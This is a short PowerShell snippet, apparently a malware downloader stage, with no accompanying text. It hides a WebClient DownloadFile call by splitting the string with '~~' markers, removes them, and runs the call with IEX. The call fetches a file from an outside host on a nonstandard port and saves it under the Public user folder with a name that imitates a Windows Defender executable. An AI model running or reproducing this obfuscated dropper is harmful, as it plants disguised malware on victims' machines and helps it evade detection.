$splited= "(New-Object System.Net.Web~~Client).Downlo~~adFile('http://rphost.ru:5885/64.signed','C:\Users\Public\MSASC.exe')"
$unsplited = $splited.Replace("~~","")
IEX $unsplited
